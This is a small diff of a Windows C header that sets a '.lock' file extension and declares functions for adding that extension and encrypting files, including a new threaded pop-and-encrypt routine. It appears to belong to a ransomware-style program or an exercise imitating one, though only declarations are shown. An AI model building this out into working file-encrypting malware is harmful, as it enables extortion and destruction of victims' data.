@@ -7,7 +7,6 @@
 #define EXT L".lock"
 
 wchar_t *add_extension(wchar_t *file_path);
-void encrypt_stack(struct Stack *files_stack);
 void encrypt_data(LPCVOID p_src, LPVOID p_dest, DWORD file_size);
-
+DWORD WINAPI pop_and_encrypt(LPVOID param);
 #endif
